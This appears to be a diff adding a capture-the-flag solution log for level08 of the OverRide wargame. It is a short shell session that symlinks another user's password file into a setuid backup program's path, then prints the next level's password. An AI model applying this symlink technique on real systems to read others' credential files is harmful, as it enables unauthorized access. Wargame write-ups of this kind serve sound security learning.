@@ -1,0 +1,8 @@
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -s /home/users/level09/.pass test
+level08@OverRide:~$ ./level08 test
+level08@OverRide:~$ ls backups/
+test
+level08@OverRide:~$ cat backups/test 
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
